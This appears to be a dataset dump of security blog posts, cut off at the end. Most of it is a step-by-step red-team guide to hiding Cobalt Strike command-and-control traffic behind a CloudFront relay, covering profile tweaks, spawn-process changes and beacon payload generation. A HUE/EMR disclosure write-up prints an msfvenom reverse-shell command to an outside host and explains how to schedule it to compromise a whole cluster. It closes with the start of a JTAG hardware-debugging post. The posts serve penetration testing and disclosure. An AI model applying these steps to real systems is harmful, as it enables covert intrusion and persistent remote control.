PyFunnels, create and store code to isolate data. The isolated data is then de-duplicated and aggregated. That aggregate data can then be leveraged for whatever the use case may be. \n\nHere is an animated view of what I just described:\n\n Animation 1: PyFunnels Concept \n\nExample Scenario\n\nTake an example of collecting domains and subdomains using five tools (overkill I know). The goal is to use the output to compare discovered domains against a known inventory. Once we have that information we can move on to remediation as necessary, decommissioning unapproved services or adding the appropriate protections to them.  Ideally, this is an ongoing and automated process and an alert is generated when there is a finding. \n\nPyFunnels\u2019 goal is to expedite the process of extracting the data. Here is the process:\n\nSpecify the output files (Figure 1)\n\nInstantiate an object (Figure 1) \n\nCall a method on the object, providing the data point of interest (Figure 2)\n\nfrom PyFunnels import PyFunnels\n#Specify the output file for each tool in a dictionary.\nsource_files = {\n   \"spiderfoot\":\"/path/to/file/spiderfoot.db\",\n \"recon_ng\":\"/path/to/file/recon-ng-tester.db\",\n \"TheHarvester\":\"/path/to/file/theharvester-tester.xml\",\n \"photon\":\"/path/to/directory/photon_results/\",\n \"nmap\":\"/path/to/file/nmap_results.xml\"\n}\n#Create a PyFunnels object.\nPyF = PyFunnels.Funnel(source_files)\n\nFigure 1: Example Setup\n\nPyFunnels will return the de-duplicated and aggregated data as a list (Figure 2). \n\ndomains = PyF.funnel_data(\"domains\")\nprint(domains)\nOutput: ['example.com', 'partner.com', 'related.com']\nfor d in domains:\n pass #Your use case here.\n\nFigure 2: Example Output\n\nThat is it. . . \n\nMove on with your day. . . \n\nPut the data to work. . . \n\nYou don\u2019t need to reinvent the wheel. After all, you are likely not the first person to parse this data out of this output file. Save time with PyFunnels and use the code you or someone else has previously committed.\n\nThought Process & Lessons Learned\n\nThe design of PyFunnels is modular, where each tool is its own class and each data point is a method of that class. The tool classes work independently of one another. You don\u2019t have to build all the methods for a tool. Ideally, every tool would have support for every data point it collects, but that can happen organically. Laying out the library this way makes it easy to contribute for any level of programmer and allows PyFunnels to accommodate an unforeseen amount of tools. \n\nThis has been my first real coding project. After I settled on the idea, I just started running with it. An early problem I encountered was I found myself reusing chunks of code while calling each tool. I didn\u2019t know the best way to layout the classes and methods. After a peer review and some research, I was able to condense 147 lines of code to 12 lines. This was a huge moment for me and necessary for the library to grow. My lesson learned here is that if you have an idea, start putting it together. The code may not look great at first but you can refine and make improvements as it develops. \n\nConclusion\n\nInformation security is a unique field where we do not need to compete with each other. Across industries, within the same industry, it is in our best interest not to compete. That was a big motivation for this project, I wanted to find a way to collaborate and provide value to the community. \n\nI believe this can become really powerful with some community adoption. The concept for PyFunnels can be simplified to, as you write Python3 code to isolate data from a tool, commit the code so it can be reused. \n\nMy goal is for PyFunnels to be something useful for other professionals and for it to grow to support a large range of tools and data points. If you use the library and/or take a look at the code, I\u2019d love feedback. Coding is new to me and I'm sure my implementation can be improved.\n\nThanks for reading, I hope you find the library useful and are able to use it in your workflows.\n\nThe PyFunnels library can be found at: \n\nhttps://github.com/packetvitality/PyFunnels\n\nhttps://pypi.org/project/PyFunnels/\n\nThe full paper I wrote as part of my MSISE can be found at:\n\nhttps://www.sans.org/reading-room/whitepapers/OpenSource/pyfunnels-data-normalization-infosec-workflows-38785\n\n*Note: I\u2019ve packaged the library and made modifications since I wrote the paper. Refer to Github and documentation within the library for current usage examples*\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Using CloudFront to Relay Cobalt Strike Traffic\"\nTaxonomies: \"Author, Brian Fehrman, C2, How-To, Informational, Red Team, Red Team Tools, Brian Fehrman, CloudFront, cobalt strike, Domain Fronting\"\nCreation Date: \"Thu, 15 Aug 2019 18:15:37 +0000\"\nBrian Fehrman //\n\nMany of you have likely heard of Domain Fronting. Domain Fronting is a technique that can allow your C2 traffic to blend in with a target\u2019s traffic by making it appear that it is calling out to the domain owned by your target. This is a great technique for red teamers to hide their traffic. Amazon CloudFront was a popular service for making Domain Fronting happen. Recently, however, changes have been made to CloudFront that no longer allow for Domain Fronting through CloudFront to work with Cobalt Strike. Is all lost with CloudFront and Cobalt Strike? In my opinion, no! CloudFront can still be extremely useful for multiple reasons:\n\nNo need for a categorized domain for C2 traffic\n\nTraffic blends in, to a degree, with CDN traffic\n\nCloudFront is whitelisted by some companies\n\nMitigates the chances of burning your whole C2 infrastructure since your source IP is hidden\n\nTraffic will still go over HTTPS\n\nIn this post, I will walk you through the steps that I typically use for getting CloudFront up and going with Cobalt Strike. The general steps are as follows:\n\nSetup a Cobalt Strike (CS) server\n\nRegister a domain and point it your CS server\n\nGenerate an HTTPS cert for your domain\n\nCreate a CloudFront distribution to point to your domain\n\nGenerate a CS profile that utilizes your HTTPS cert and the CloudFront distribution\n\nGenerate a CS payload to test the setup\n\n1. Setup a Cobalt Strike (CS) server\n\nIn this case, I set up a Debian-based node on Digital Ocean (I will call this \u201cyour server\u201d). I ran the following to get updated and setup with OpenJDK, which is needed for Cobalt Strike (CS):\n\napt-get update && apt-get upgrade -y && apt-get install -y openjdk-8-jdk-headless\n\nGrab the latest Cobalt Strike .tgz file from https://www.cobaltstrike.com/download and place it onto your server. Unzip the .tgz, enter the directory, and install it with the following commands:\n\ntar -xvf cobaltstrike-trial.tgz && cd cobaltstrike && ./update\n\nNote that you will need to enter your license key at this point. This is all the setup that we need to do for now on CS. We will do some more configuration as we go.\n\n2. Register a domain and point it to your CS server\n\nWe will need to register a domain so that we can generate an HTTPS certificate. CloudFront requires that you have a valid domain with an HTTPS cert that is pointed at a server that is running something like Apache so that it can verify that the certificate is valid. The domain does not need to be categorized, which makes things easy. I like to use https://www.namesilo.com but you are free to use whatever registrar that you prefer. In this case, I just searched for \u201cbhisblogtest\u201d and picked the cheapest extension, which was bhisblogtest.xyz for $0.99 for the year.\n\n Searching for a Domain \n\nOne of the reasons that I like namesilo.com is that you get free WHOIS Privacy; some companies charge for this. Plus, it doesn\u2019t tack on additional ICANN fees.\n\n WHOIS Privacy Included for Free by namesilo.com \n\nAfter you register the domain, use namesilo.com to update the DNS records. I typically delete the default records that it creates. After deleting the default DNS records, create a single A-Record that points to your server. In this case, my server\u2019s IP was 159.65.46.217. \n\nNOTE: For those of you that are getting some urges right now, I wouldn\u2019t suggest attacking it as it was burned before this was posted and likely belongs to somebody else if it is currently live.\n\n Searching for a Domain \n\nWait until the DNS records propagate before moving onto the next step. In my experience, this will typically take about 10-15 minutes. Run your favorite DNS lookup tool on the domain that you registered and wait until the IP address returned matches the IP address of your server. In this case, we run the following until we see 159.65.46.217 returned:\n\nnslookup bhisblogtest.xyz\n\n DNS Record has Propagated \n\nNote: Debian doesn\u2019t always have DNS tools installed\u2026 you might need to run the following command first if you can\u2019t use nslookup, dig, etc.:\n\napt-get install -y dnsutils\n\n3. Generate an HTTPS certificate for your domain\n\nIn the old days, you had to pay money for valid certificates that were signed by a respected Certificate Authority. Nowadays, we can generate them quickly and freely by using LetsEncrypt. In particular, we will use the HTTPsC2DoneRight.sh script from @KillSwitch-GUI. Before we can use the HTTPsC2DoneRight.sh script, we need to install a few prerequisites. Run the following commands on your server, assuming Debian, to install the prerequisites:\n\napt-get install -y git lsof\n\nNext, make sure you are in your root directory, grab the HTTPsC2DoneRight.sh script, enable execution, and run it:\n\ncd && wget https://raw.githubusercontent.com/killswitch-GUI/CobaltStrike-ToolKit/master/HTTPsC2DoneRight.sh && chmod +x HTTPsC2DoneRight.sh && ./HTTPsC2DoneRight.sh\n\nOnce the script runs, you will need to enter your domain name that you registered, a password for the HTTPs certificate, and the location of your \u201ccobaltstrike\u201d folder.\n\n Running HTTPsC2DoneRight.sh \n\nIf all goes well, you should have an Amazon-based CS profile, named amazon.profile, in a folder named \u201chttpsProfile\u201d that is within your \u201ccobaltstrike\u201d folder. The Java Keystore associated with your HTTPS certificate will also be in the \u201chttpsProfile\u201d folder.\n\n Output from HTTPsC2DoneRight.sh \n\nIf you run the command tail on amazon.profile, you will see information associated with your HTTPS certificate in the CS profile. We will actually be generating a new CS profile later but will need the four lines at the end of amazon.profile for that profile.\n\n The tail of amazon.profile from HTTPsC2DoneRight.sh Showing Certificate Information Needed for CS Profile \n\nAt this point, you should be able to open a web browser, head to https://, and see the default Apache page without any certificate errors. If the aforementioned doesn\u2019t happen, then something has gone wrong somewhere in the process and the remaining steps likely won\u2019t succeed.\n\n Verifying HTTPS Certificate was Correctly Generated \n\n4. Create a CloudFront distribution to point to your domain\n\nThe next step is to create a CloudFront distribution and point it your domain. The following is the article that I originally used and still reference to get the settings correct:\n\nhttps://medium.com/rvrsh3ll/ssl-domain-fronting-101-4348d410c56f\n\nHead to https://console.aws.amazon.com/cloudfront/home and login or create an account if you don\u2019t have one already; it\u2019s free. Click on \u201cCreate Distribution\u201d at the top of the page.\n\n Create CloudFront Distribution \n\nClick on \u201cGet Started\u2019 under the \u201cWeb\u201d section of the page.\n\n Choosing \u201cGet Started\u201d under \u201cWeb\u201d Section \n\nEnter in your domain name for the \u201cOrigin Domain Name\u201d field. The \u201cOrigin ID\u201d field will automatically be populated for you. Make sure that the remaining settings match the following screenshots.\n\n First Section of CloudFront Distribution Settings \n\n Second Set of CloudFront Distribution Settings \n\nThe remaining settings that are not included in the screenshots above do not need to be altered. Scroll to the bottom of the page and click the \u201cCreate Distribution\u201d button.\n\n Click \u201cCreate Distribution\u201d after Updating CloudFront Settings \n\nYou will be taken back to the CloudFront main menu and you should see a cloudfront.net address that is associated with your domain. The CloudFront address will be what we use to refer to our server from now on. You should see \u201cIn Progress\u201d under the \u201cStatus\u201d column. Wait until \u201cIn Progress\u201d has changed to \u201cDeployed\u201d before proceeding. You may need to refresh the page a few times as this could take 10 or 15 minutes.\n\n CloudFront Distribution Address Deploying \n\nAfter your distribution has been deployed, test that it is working by visiting https:// and verify that you see the Apache2 default page without any certificate errors.\n\n Verifying CloudFront Distribution is Deployed \n\n5. Generate a CS profile that utilizes your HTTPS cert and the CloudFront distribution\n\nWe will now generate a CS profile to take advantage of our CloudFront distribution. Since most default CS profiles get flagged, we will take the time here to generate a new one. On your server, head back to the home directory and grab the Malleable-C2-Randomizer script by bluescreenofjeff.\n\ncd && git clone https://github.com/bluscreenofjeff/Malleable-C2-Randomizer && cd Malleable-C2-Randomizer\n\nThe next step is to generate a random CS profile. I\u2019ve found that the Pandora.profile template provides the fewest issues with this technique. Run the following command to generate a profile.\n\npython malleable-c2-randomizer.py -profile Sample\\ Templates/Pandora.profile -notest\n\nWe need to copy the profile that was created to the \u201chttpsProfile\u201d folder in our \u201ccobaltstrike\u201d folder. The screenshot below shows an example of the output from the Malleable-C2-Randomizer script and copying that file to the \u201chttpsProfile\u201d folder.\n\n Copying Malleable-C2-Randomizer Output-File to /root/cobaltstrike/httpsProfile/ \n\nHead into the \u201chttpsProfile\u201d folder so that we can modify our newly-created CS profile.\n\ncd /root/cobaltstrike/httpsProfile\n\nRemember when we did a tail on the amazon.profile file and saw the four lines that started with \u201chttps-certificate\u201d? We need to grab those four lines and place them at the bottom of our new, CS Pandora-profile. Run the command tail again on amazon.profile and copy the last four lines (the https-certificate section).\n\n Copy Last Four Lines of amazon.profile \n\nOpen the newly-created Pandora profile in the text editor of your choice. Paste the four lines that you just copied to the bottom of the Pandora profile.\n\n Pasting Certificate Information into Pandora Profile \n\nFor good OpSec, we should change the default process to which our payload will spawn. Add the following lines to the end of your Pandora profile file, underneath of the https-certificate section that you added.\n\npost-ex {        \n set spawnto_x86 \"%windir%\\\\syswow64\\\\mstsc.exe\";\n        set spawnto_x64 \"%windir%\\\\sysnative\\\\mstsc.exe\";\n}\n\n Code Added to Pandora Profile to Change SpawnTo Process \n\nThe last thing that we need to modify in our Pandora profile is the host to which our payload will beacon. There are two places in the profile where the host needs to be changed. Find both locations in the Pandora profile where \u201cHost\u201d is mentioned and change the address to point to your cloudfront.net address that was generated as part of your CloudFront distribution.\n\n One Location of \u201cHost\u201d Value in Pandora Profile \n\n Other Location of \u201cHost\u201d Value in Pandora Profile \n\nKill the apache2 service on your server since it will conflict with the CS Listener that we will create in the final step. Run the following command on your server:\n\nservice apache2 stop\n\nWe are now ready to launch our CS Team Server with the new profile. Move up a directory so that you are in the cobaltstrike directory, which is /root/cobaltstrike in this case. Run the CS Team Server with the following template for a command:\n\n./teamserver \n\n Running CS Team Server with Custom Pandora Profile \n\nThe CS Team Server should now be up and running and we can move onto the final steps.\n\n6. Generate a CS payload to test the setup\n\nThe final step is to start a CS Listener and generate a CS payload. This step assumes you have installed the CS client on a system. Open the CS client and connect to your CS Team Server.\n\n Connecting to CS Team Server \n\nChoose the option in the CS client to add a new listener. Name the listener anything that you would like, which is \u201crhttps\u201d in this example. Select the \u201cwindows/beacon_https/reverse_https\u201d payload in the drop-down menu. In the \u201cHost\u201d field, enter the address of your CloudFront distribution that you created earlier. Enter 443 in the \u201cPort\u201d field\u201d and then click save.\n\n Settings for CS Listener \n\nAn additional popup screen will be shown that asks you to enter a domain to use for beaconing. Enter your CloudFront distribution address as the domain for beaconing and click the \u201cOk\u201d button.\n\n CloudFront Address Used as Beaconing Domain \n\nYou should now have a CS Listener up and running that is taking advantage of all of the work that has been done up to this point. The last step is to generate a payload to test that everything is working. I will state at this point that any CS Payload that you generate and attempt to use without additional steps will almost certainly be caught by AV engines. Generating a payload that does not get caught by AV is enough material for another blog post. The gist of it is that you typically generate CS Shellcode and use a method to inject that shellcode into memory. We will not dive into those details in this blog post as the focus on this post is how to use CloudFront as a relay for CS. For our purposes here, disable all of the AV that you have on the Windows system on which you will run the payload. Select the \u201cHTML Application\u201d payload from the menu shown in the screenshot below.\n\n Selecting HTML Application as CS Payload Format \n\nMake sure that the \u201cListener\u201d drop-down menu matches the name that you gave to your listener, which is \u201crhttps\u201d in this case. Choose \u201cExecutable\u201d from the \u201cMethod\u201d drop-down menu. Click the \u201cGenerate\u201d button, choose a location to save the payload, and then run the payload by double-clicking on the file that was generated. You should observe in your CS-client window that a session has been established!\n\n Choosing Payload Listener and Method \n\n Session Established \n\nProtections\n\nPreventing attackers from using CloudFront as a relay in your environment is, unfortunately, not as easy as just disallowing access to CloudFront. Disallowing access to CloudFront would likely \u201cbreak\u201d a portion of the internet for your company since many websites rely on CloudFront. To help mitigate the chances of an attacker establishing a C2 channel that uses CloudFront as a relay, we would suggest a strong application-whitelisting policy to prevent users from running malicious payloads in the first place.\n\nConclusion\n\nUsing CloudFront as a relay for your C2 server has many benefits that can allow you to bypass multiple protections within an environment and hide the origin of your C2 server. This article walked through all the steps that should be needed to set up a CloudFront distribution to use as a relay for a Cobalt Strike Team Server. Generating CS payloads that evade AV will be discussed in future posts.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Securing the Cloud: A Story of Research, Discovery, and Disclosure\"\nTaxonomies: \"Author, How-To, Informational, Jordan Drysdale, AWS EC2, AWS EMR, Coordinated disclosure, Jordan Drysdale, Nessus, Nmap, pentest, securing the Internet\"\nCreation Date: \"Wed, 21 Aug 2019 19:51:38 +0000\"\nJordan Drysdale //\n\ntl;dr\n\nBHIS made some interesting discoveries while working with a customer to audit their Amazon Web Services (AWS) infrastructure. At the time of the discovery, we found two paths to ingress the customer\u2019s virtual private cloud (VPC) through the elastic map reduce (EMR) application stacks. One of the vulns that gained us internal access was the Hadoop Unauthenticated RCE, which was patched by Apache a while back now. Another, and a bit more interesting entry point, was the HUE interface, which, by default, allows the creation of a new admin user for the web interface. Once in the web interface, HUE is similar to Jupyter in that it helps visualize code flow and operations. Here, you can create schedules that will send egress shells from the cluster worker nodes. Which, consequently, provides a window to a virtual private cloud network. \n\nLots of the links, best practices, security operations on AWS stuff, and a lot of the words below come from an amazing guy named Zack. Thank you Zack -  for helping the digital world get better every day. \n\n...and on to the story.\n\nBig data processing engines form the backbone of today\u2019s large tech companies. As a result, the Internet has become a collection of data centers seemingly hell-bent on gathering as much information about us as possible. This data is aggregated, compiled, and then stuffed in demographic containers. Access to those demographic containers is then sold to bidders who want to deliver advertising, political propaganda, and all sorts of other nonsense. Welcome to the Big Data era, where aggregated data points are bought and sold for pennies on the Internet every minute of every hour. \n\nWhat does this actually have anything to do with infosec, pentesting, security \u201cin the cloud\u201d or \u201cof the cloud\u201d -- whatever? One of these big data solutions on AWS is called EMR - \u201cElastic Map Reduce.\u201d I think it\u2019s HDInsight on Azure and Cloud Dataproc on Google Cloud (GCP). With a couple of clicks, you too - like Black Hills InfoSec - can deploy your own data processing engine, of whatever size you choose on whatever platform makes sense for whatever purpose.\n\nAs part of deploying solutions in the cloud, it is the responsibility of sysadmins to configure, manage, and secure those services. It is the responsibility of leadership, ownership, and Boards of Directors everywhere to implement and enforce policies and procedures that pentesters and auditors can double-check via exploit testing and policy checkbox validations. The responsibility of physical security, deploying proper virtualization, maintaining hardware, and then selling us those services belongs to the cloud provider. In the case of EMR, with a few clicks, several EC2 instances are deployed in a master/worker model. Instructions and operations are sent using the master\u2019s console which are subsequently processed by the worker nodes.\n\nSo, all that to get to the point\u2026 securing our services. BHIS uses Tenable\u2019s products, for the most part, as our standard vulnerability scanner. Is it perfect? No. Does it accomplish our goals? Yes. As part of a pretty standard pentest, a typical BHIS customer might ask for an external network review and an internal pentest. BHIS practices the things we preach most of the time and so we periodically scan and pentest our own external and internal services. \n\nHold up here - a bit more clarification is necessary. The EMR cluster is just a few clicks to deploy and was designed to be an easy to implement solution with minimal effort required to maximize data processing capabilities. We are testing against a deployment sitting at defaults, with a single modification to the security group that allowed our scanner full network access. \n\nSome statistics from the scan can be reviewed in the next few bullet points. \n\nThree node cluster\n\n55 individual and unique open ports at default\n\n10 total mixed vulnerabilities: Low / Medium / High / Critical\n\nUnsupported PHP version 5.6.40 on master node\n\nLet\u2019s stop here and review some things again. The EMR cluster is a collection of third-party applications running on an Amazon pre-baked AMI running these file system services:\n\nHadoop Distributed File System\n\nElastic Map Reduce File System (super cool - can talk file system to S3) \n\nA list of the software that comes pre-installed on this cluster looks something like this: \n\nHue - Versions vary\n\nYet Another Resource Navigator (YARN)\n\nHadoop MapReduce\n\nFlink\n\nApache Spark\n\nGanglia\n\nHive\n\nJupyter\n\nOozie\n\nPig\n\nEt cetera ad infinitum.\n\nRef: https://docs.aws.amazon.com/emr/latest/ReleaseGuide/images/emr-releases-5x.png\n\nMind you, and if you aren\u2019t already aware, this is a pretty extensive ecosystem of services to secure. One of the most amazing things about this ecosystem is how efficient the single click deployment services are. Honestly, running this solution along with scaling technologies and some code automation can result in an incredibly efficient data processing solution. So what are the security implications of all this open sourcery? For the stack deployer, it's easy to assume things are mostly secure when spinning up an EMR cluster includes the following layered protections: \n\nAmazon EMR's default security groups do not allow ingress from the Internet\n\nAmazon EMR-Managed Security Groups allow customers to have AWS manage the network connectivity between their master and worker nodes\n\nEMR Docs on network management provide warnings to customers about exposing their EMR infrastructure to the Internet\n\nIf you can forgo SSH access to your non-interactive cluster, it can simplify hardening the EMR cluster.\n\nAmazon EMR release versions 5.10.0 and later support Kerberos to control access to nodes in the cluster. Full documentation is posted online.\n\nThere is much more. The next list covers best practices documented by AWS for customers to further secure their infrastructure:\n\nIf a cluster is used for batch processing and an interactive user, or another application does not need to access it, launch the cluster in a private subnet with an S3 endpoint and any other required endpoints. See Configure Networking for more information.\n\nCustomers can launch clusters in a VPC private subnet - a subnet without any ingress/egress points defined. If the cluster does require access, ssh to an AWS service that does not have a VPC endpoint or requires access to the internet. Customers can create a NAT instance to provide a layer of control between the VPC subnet and the Internet. Scenario 2 in the documentation \u201cVPC with Public and Private Subnets (NAT)\u201d has more information.\n\nIf a customer is using a private subnet and creating an S3 endpoint, they can use an S3 policy to restrict access for the endpoint. The minimum policy requirement is documented at Amazon EMR 2.x and 3.x AMI Versions.\n\nIf customer's launch in a VPC private subnet, but still require interactive access to the cluster. A customer can create a bastion host (also known as an edge node) that sits in a public subnet and connect to your EMR cluster from it. This setup allows you to enforce security policies on the edge node, but not on the EMR cluster. A guide is provided to Securely Access Web Interfaces on Amazon EMR Launched in a Private Subnet on the AWS Big Data Blog.\n\nTaking the steps to manage and secure this infrastructure is still the responsibility of business owners, technical implementers, IT auditors -- basically every stakeholder up and down the chain of command. The nature of open source requires extra attention. Security does not fall lightly on systems administrators tasked with data management and security. There are layers of considerations, processes, procedures, and controls to consider throughout the systems life cycle. And, as part of our lack of initial documentation review and diligence, we confirmed you can add your new admin user and execute malicious code through HUE during our vulnerability scan and test.\n\nThe Hue service comes up waiting for a new administrative user. This is bad, right? Auto-scaling can spin up EMR - depending on your usage - at the rate of several clusters per day. It becomes exceptionally difficult to control the service seen below. \n\n Hue Management Interface at Defaults \n\nWe added a user as most reasonable ethical hackers would do. The Hue interface allows you to design tasks in various languages and schedule them to run in the cluster. Since we are tasking the master node with scheduling work, we can hopefully have it run C2 code. The following screenshot demonstrates the next step in accessing the worker node shells. \n\n Query dropdown box > Scheduler > Workflow \n\nOnce inside the workflow, drag and drop the \u201cshell\u201d option.\n\n Run A Shell Script! \n\nWe are then prompted to upload a file or run a command and we head over to our msfconsole. In testing, binary files don\u2019t seem to run as expected, but the following command worked to gen up a reverse_bash shell that consistently called back.\n\nmsfvenom -p cmd/unix/reverse_bash LHOST=1.1.1.1 LPORT=443 -f raw > shell-revBash.sh\n\nUploading the shell-revBash file as seen here, clicking on it, and saving the workbook is next. \n\n Reverse Shell Posted to Local HDFS Storage \n\nThen run it via the workflow\u2019s play button.\n\n Top Right - Play! \n\nThat is pretty much it, and we get a shell. The thing is, and this is important, is that you can schedule this workflow. If you schedule it, like a normal code operation, running say every five minutes, you will end up compromising all of the workers in the cluster. If your C2 channel connects over DNS, you might end up with a semi-resilient C2 channel back to a VPC. \n\n Shellz as \u2018yarn\u2019 \n\nLet\u2019s review these couple of vulnerabilities. First, the Hue interface comes up waiting for someone to create an admin user. That user can create workflows and execute shell scripts through the underlying Oozie editor. Second, those tasks can be scheduled tasks and an entire cluster can be compromised using reverse shells. The shells can be used to move laterally through a VPC.\n\nLayers of things had to happen for these bits and pieces to land us an actual C2 channel into a VPC. However, it really could be as simple as landing a session on a jump host and finding TCP port 8888 open somewhere. Or, you could check Shodan and see if any of these might be exposed to the Internet. At the time of initial write-up, somewhere around December 2018, there were about 900 Hue interfaces exposed. As of August 20, 2019, there were 663 instances that may be vulnerable to this compromise. \n\n Shodan Results on Hue Related Interfaces \n\nYou can figure out the Shodan search yourself, it\u2019s not that hard. That said, this has been disclosed to Amazon and researched on GCP. Amazon is aware of the concerns this might present to customers with public-facing EMR installations. Scaling is also a concern because new clusters will come online in a state ready for pillaging. Be extra cautious about your jump hosts, these are a very likely avenues for compromise. Bottom line - this isn\u2019t necessarily a vulnerability, more like a \u201cfeature\u201d of HUE, but it is a significant risk. \n\nSecure your services. Read the manual. Hire pentest firms to cover gaps. Get training. Develop an incident response plan. \n\nHugs and cookies,\n\nBHIS - Jordan\n\nLinks.\n\nHUE! - http://gethue.com\n\nJupyter Code Flows UI - http://jupyter.com\n\nKerberos Integration for Elastic Map Reduce - https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-kerberos.html\n\nEMR Release Info and Software - https://docs.aws.amazon.com/emr/latest/ReleaseGuide/images/emr-releases-5x.png\n\nAWS Networking Overview - https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-plan-vpc-subnet.html\n\nVPCs, NAT, and YOU! - https://docs.aws.amazon.com/AmazonVPC/latest/UserGuide/VPC_Scenario2.html\n\nAWS AMIs for EMR - https://docs.aws.amazon.com/emr/latest/DeveloperGuide/private-subnet-iampolicy.html\n\nSecure Access for EMR - https://aws.amazon.com/blogs/big-data/securely-access-web-interfaces-on-amazon-emr-launched-in-a-private-subnet/\n\nChris Gates Offensive AWS Tools - https://github.com/carnal0wnage/weirdAAL\n\nNCC Group\u2019s ScoutSuite Utilities - https://github.com/nccgroup/ScoutSuite\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"JTAG - Micro-Controller Debugging\"\nTaxonomies: \"Author, Hardware Hacking, How-To, Informational, Ray Felch, debugging, hardware hacking, JTAG, JTAGulator, picocom, Raymond Felch\"\nCreation Date: \"Tue, 27 Aug 2019 18:20:55 +0000\"\nRaymond Felch //\n\nBeing an embedded firmware engineer for most of my career, I quickly became fascinated when I learned about reverse engineering firmware using JTAG.   I decided to take on this project as an opportunity to learn more about this somewhat obscure and often overlooked attack vector. \n\nexcerpt from: https://en.wikipedia.org/wiki/JTAG \n\nJTAG (named after the Joint Test Action Group which codified it) is an industry-standard for verifying designs and testing printed circuit boards after manufacture. JTAG implements standards for on-chip instrumentation in electronic design automation (EDA) as a complementary tool to digital simulation. It specifies the use of a dedicated debug port implementing a serial communication interface for low-overhead access without requiring direct external access to the system address and data buses. The interface connects to an on-chip Test Access Port (TAP) that implements a stateful protocol to access a set of test registers that present chip logic levels and device capabilities of various parts. The Joint Test Action Group formed in 1985 to develop a method of verifying designs and testing printed circuit boards after manufacture. In 1990 the Institute of Electrical and Electronics Engineers codified the results of the effort in IEEE Standard 1149.1-1990, entitled Standard Test Access Port and Boundary-Scan Architecture.\n\nJTAG is an industry-standard Test Access Port for debugging and running diagnostics of integrated circuits after a PCB has been assembled. Originally providing manufacturers with a simplified way to test a circuit board design, it's even more relevant now that devices are using a Ball Grid Array (BGA) making it difficult to test due to the reduced size. Additionally, an exposed interface creates the means for engineers to assess the signals without directly interfacing using physical connections to circuits.\n\nAfter reviewing a variety of JTAG related videos, I discovered a number of positive benefits in gaining access to the target device, especially the ability to read and write to these devices.  The possibilities seemed endless. \n\nIn an effort to get started, I located a Linksys BEFSR41 ver2 router at a local garage sale, and it was 'game on' to begin experimenting with a few of the many JTAG hardware and software tools. I was determined to duplicate the efforts and accomplishments of some of those videos that I had witnessed.\n\nAfter much research, I decided to purchase the JTAGulator board from Parallax, and a couple of popular serial interface boards, DangerousPrototypes Bus Pirate and Bus Blaster, as well as the Attify Badge.\n\nI started with the JTAGulator, an open-source hardware tool designed by Joe Grand to not only locate, but also identify the JTAG pins on the target board, which in turn, provides the ability to find on-chip debugging (OCD) interfaces. Also featured on this tool is the ability to locate and identify UART pins.\n\nLocate and identify the JTAG pins on the target board\n\nBefore getting started, I first located and printed datasheets for the target board, the Linksys BEFSR41 ver2 router.\n\nI quickly found the following devices on board:\n\nCPU: Samsung S3C4510001    ARM7TDI 50Mhz\n\nFlash memory:  MX 29F040QC-90    5 volt CMOS ( 512Kbit x 8 ) 0.5 Mbyte\n\nSDRAM memory:  SI IC41C16256-35K x2 512Kbyte - 256K x 16 dynamic RAM\n\nEthernet controllers: RealTek RTL8019AS ISA Full-Duplex Controller \n\nKENDIN KS8995E 5-port 10/100 Integrated Switch\n\nBased upon information that I acquired watching instructional videos for the JTAGulator board (by its author Joe Grand), I determined what I thought might be a JTAG TAP (test access point) at JP-1.\n\nJoe Grand's JTAGulator video: https://www.youtube.com/watch?v=GgMOBhmEJXA\n\nIdentify the JTAG pins\n\nOften you'll find TMS, TCK, TDI, TDO, etc inscribed on your PCB, so you know you're dealing with a device that supports JTAG, but it gets more difficult when the pins aren't labeled and you need to rely on third-party documentation. \n\nOf course, it is also possible that your board has a JTAG header instead of mere pins/contacts. JTAG access points are often intentionally hidden by the board designers, and in most cases lack headers or board markings. You might also get the datasheet on the on-board micro-controller. Sometimes, the pins are marked with JTAG  references and the PCB traces might lead out to an access point.\n\nFor example:\n\nOn my target board, JP-1 is a header-less 2 x 7 row of feed-thru pin sockets. \n\nFinally, I needed to locate ground on the target device and jumper it to a GND pin on the JTAGulator board. NOTE: The JTAGulator and the target device MUST share a common ground point (to ensure proper reference voltages and reliable readings) before continuing with any testing.\n\nAlso, using a desoldering tool (solder sucker), I cleared the solder from the JP-1 pin sockets and soldered in (2) 7 pin male headers to facilitate hooking up jumper wires for my debugging.\n\nUsing a multimeter, I determined that pins 2, 4, 6, 8, 10, 12, and 14 were all tied to circuit-ground. This left 8 (unknown) pins, of which 5 could be the 4 required (and 1 optional) JTAG pins:\n\n    TDI     Test data in\n\n    TDO    Test data out\n\n    TMS    Test mode select\n\n    TCK     Test clock\n\n    TRST    Test reset (optional)\n\nUsing channels 0 through 7 on the JTAGulator board, I connected jumper wires to the 8 (unknown) pins on the target device (order of connection was not relevant). Note: pin-14 is the green (GND) jumper wire.\n\nAt this point, I powered the target device (using the manufacturer provided 9VDC adapter) and then powered the JTAGulator board via the mini-USB cable to my Linux desktop.\n\nIn a command shell on my Linux machine, I located the serial port of the JTAGulator and established a serial connection to it using picocom, a minimal dumb-terminal emulation program that is great for accessing a serial port based Linux console.\n\nInstalling picocom:\n\nOn Ubuntu, you can simply:\n\nsudo apt-get install picocom\n\nExcerpt from the QuickStart instructions:  https://www.parallax.com/sites/default/files/downloads/32115-JTAGulator-Product-Brief-1.1.pdf\n\nThe JTAGulator is powered from the host computer\u2019s USB port and uses an industry-standard FTDI FT232RL device to provide the USB connectivity (drivers available from www.ftdichip.com/Drivers/VCP.htm.) The device will appear as a Virtual COM port and will have a COM port number automatically assigned to it. All communication is 115200 bps, 8 data bits, no parity, 1 stop bit. Use a terminal program (for example, HyperTerminal, PuTTY, CoolTerm, picocom, or screen) to communicate with the JTAGulator.\n\n$ dmesg | grep tty    (determine serial device port)\n\n$  sudo picocom -b 115200 -r -l /dev/ttyUSB0    ( -b = baudrate  and -r = no reset  and -l = no lock )\n\nClicking [ENTER] gets me the ':' JTAGulator command prompt\n\n: H (prints available commands)\n\nBefore proceeding any further, I needed to determine the system voltage of the target device. This was done using a multimeter set up for DC voltage measurements and checking various points around the target board (including the header that I soldered in). It was determined the system voltage was 3.3 volts.\n\n: V Set target system voltage (1.2V to 3.3V)\n\nBefore executing the Identify JTAG pinout (BYPASS Scan), I performed an Identify JTAG pinout (IDCODE Scan) \n\nExecuting the ID code scan is considerably faster than the Bypass scan (TDI is not required, resulting in fewer scan permutations), although the ID scan only finds 3 of the required 4 JTAG 